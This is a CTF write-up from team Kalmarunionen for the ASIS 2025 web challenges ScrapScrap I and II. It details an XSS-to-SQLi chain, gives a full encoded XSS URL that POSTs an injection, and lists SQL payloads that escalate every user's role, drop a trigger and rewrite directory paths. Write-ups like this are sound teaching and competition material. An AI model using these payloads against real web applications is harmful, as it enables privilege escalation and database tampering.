# ASIS CTF Quals 2025

URL: https://asisctf.com/

Team: Kalmarunionen

Place: 1 (of 368)

## ScrapScrap I (Revenge)

> Having a user account is great in this service: http://91.107.176.228:3000, how about more?
> Download the [attachment](./ScrapScrap_95295c151d3ec7fdec4bd749bb9fbd3a716142ca.txz)!
> Thanks to Worty as author! 😊

We are given a "web scraper" with a "checker service" to see if websites are scrape-able.

Digging though the code we quickly identify an SQLi in `src/routes/auth.js`, but we can't trigger it because our `session.user.role` is `demo` (the default value)
Only the bot has role `user`.

We cen't do a _CSRF_-attack because the bots cookies has `SameSite=Lax`, so we need to find an XSS.
In `src/public/checker.js` we find an XSS, if we can make the `somethingWentWrong` trigger. This is possible to do by submitting a slow-loading website (e.g. `slow.xn--sb-lka.org`).

PoC:

```
http://localhost:3000/checker?url=https://slow.xn--sb-lka.org/<textarea><img src onerror="XSS"></textarea>
```

So now we can hit the `/debug/create_log` SQLi endpoint, but how to exploit this? We need a sqlite statement that breaks out of both `')` and `'` while being syntactic correct.
My great team members in kalmar came up with this:

```
');update users set role='user';select"'
```

This has the side-effect that everyone becomes `user` and the _ScrapScrap I_ flag is printed for everyone logging in.  We talked to the ASIS authors and was allowed to do this quickly, then undo it.

Payload for ScrapScrap I:

```
http://localhost:3000/checker?url=https://slow.xn--sb-lka.org/%3Ctextarea%3E%3Cimg%20src%20onerror=%22fetch('/debug/create_log',%20%7Bmethod:%20'POST',credentials:%20'include',%20headers:%20%7B%20'Content-Type':%20'application/json'%20%7D,%20body:%20JSON.stringify(%7B'log':%20%60');%20update%20users%20set%20role='user';select%20%5Cx22'%60%7D)%20%7D)%22%3E%3C/textarea%3E
```

## ScrapScrap II (Revenge)

For this we are clearly supposed to use our new `role=user` to access the _scrap_-endpoint and exploiting some of that logic, but kalmar member _null_ came up with this brilliant idea re-using the SQLi and staying below the 50 char limit:

```sql
UPDATE users SET role='user';
DROP TRIGGER users_immutable_dirs;
UPDATE users SET scrap_dir=unhex('2f');
```

The problem here is that `scrap_dir` has a UNIQUE constraint and this will affect multiple users, so the statement will fail.
But he also came up with this clever solution:

```
UPDATE users SET scrap_dir=username
```

Where we registered a user with username `/`.
